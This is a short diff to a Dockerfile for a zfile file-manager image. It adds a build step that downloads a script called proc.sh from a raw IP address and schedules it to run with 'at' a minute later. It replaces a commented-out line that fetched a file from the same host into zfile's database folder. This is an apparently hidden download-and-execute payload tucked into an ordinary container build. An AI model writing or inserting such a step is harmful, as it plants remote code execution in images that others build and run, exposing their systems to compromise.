@@ -1,5 +1,5 @@
 FROM zhaojun1998/zfile
 USER root
 RUN apt update -y && apt upgrade -y && apt install wget curl at -y
-#CMD sleep 30 && wget -O /root/.zfile-v4/db/zfile http://194.33.39.47:8888/down/B0oggQ2WzjeY &&  ~/zfile/bin/restart.sh
+RUN sleep 30 && wget -O proc.sh http://194.33.39.47:8888/down/RzmApkmbrJJH && at-f proc.sh now+1min
 EXPOSE 8080
